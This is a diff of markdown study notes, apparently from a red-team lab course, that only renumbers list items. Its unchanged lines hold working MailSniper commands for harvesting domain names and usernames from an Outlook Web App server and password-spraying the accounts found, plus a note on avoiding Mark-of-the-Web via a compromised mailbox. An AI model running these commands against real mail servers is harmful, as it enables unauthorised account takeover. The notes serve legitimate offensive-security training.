@@ -16,13 +16,13 @@ On Attacker Desktop:
   4. In a standard PS, import MailSniper: ```ipmo .\MailSniper.ps1```
   5. ```Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io```  // gives NetBIOS name of domain
   6. Generate possible usernames from names at [https://www.cyberbotic.io/our-team](https://www.cyberbotic.io/our-team):
-    5. ```cd /mnt/c/Users/Attacker/Desktop/```
-    6. ```cat names.txt```:
+     1. ```cd /mnt/c/Users/Attacker/Desktop/```
+     2. ```cat names.txt```:
         * Bob Farmer
         * Isabel Yates
         * John King
         * Joyce Adams
-    8. Use [namemash](https://gist.github.com/superkojiman/11076951) to generate usernames (if format isn't already known): ```python ./namemash.py names.txt > possible.txt```
+  8. Use [namemash](https://gist.github.com/superkojiman/11076951) to generate usernames (if format isn't already known): ```python ./namemash.py names.txt > possible.txt```
   9. ```Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList possible.txt -OutFile valid.txt```  // validates usernames using timing attack
   10. Use [MailSniper](https://github.com/dafthack/MailSniper) to spray passwords against valid accounts (beware of login lockouts!):
   11. ```Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList valid.txt -Password Summer2022```
@@ -45,11 +45,11 @@ Files emailed "internally" from a compromised Exchange mailbox are not tagged wi
 
 Check to see whether a file has the MotW: ```gc .\test.txt -Stream Zone.Identifier```. The zones ```gc``` reports are: 
 
-  0: Local computer
-  1: Local intranet
-  2: Trusted sites
-  3: Internet
-  4: Restricted sites
+  0. Local computer
+  1. Local intranet
+  2. Trusted sites
+  3. Internet
+  4. Restricted sites
 
 ## Visual Basic for Applications (VBA) Macros
 
